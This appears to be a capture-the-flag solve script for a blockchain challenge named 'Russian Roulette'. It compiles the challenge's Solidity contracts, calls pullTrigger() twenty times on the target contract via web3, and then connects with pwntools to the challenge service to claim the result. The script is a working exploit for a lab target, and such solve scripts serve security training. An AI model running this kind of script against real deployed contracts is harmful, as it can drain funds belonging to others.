import pwn
from web3 import Web3
import requests
import solcx

base = "94.237.49.182:59523"

w3 = Web3(Web3.HTTPProvider(f"http://{base}"))
info = requests.get(f"http://{base}/connection_info").json()

print(f"{info['TargetAddress']=}")
print(f"{info['setupAddress']=}")


def get_contract(filename, address):
    solcx.install_solc("0.8.23")
    solcx.set_solc_version("0.8.23")

    compiled_sol = solcx.compile_files([filename])
    key = filename[2:] + ":" + filename[2:].split(".")[0]
    contract_interface = compiled_sol[key]

    return w3.eth.contract(address=address, abi=contract_interface["abi"])


def create_contract(filename, arg=[]):
    solcx.install_solc("0.8.23")
    solcx.set_solc_version("0.8.23")

    compiled_sol = solcx.compile_files([filename])
    key = filename[2:] + ":" + filename[2:].split(".")[0]
    contract_interface = compiled_sol[key]

    contract = w3.eth.contract(
        abi=contract_interface["abi"], bytecode=contract_interface["bin"]
    )
    tx_hash = contract.constructor(*arg).transact()
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

    return tx_receipt.contractAddress


def wait(t):
    print(w3.eth.wait_for_transaction_receipt(t))

SetupContract = get_contract(
    "./blockchain_russian_roulette/Setup.sol", info["setupAddress"]
)
RussianRouletteContract = get_contract(
    "./blockchain_russian_roulette/RussianRoulette.sol", info["TargetAddress"]
)


for i in range(20):
    wait(RussianRouletteContract.functions.pullTrigger().transact())

p = pwn.remote("94.237.49.182", "48780")
p.sendlineafter("action?", "3")
p.interactive()
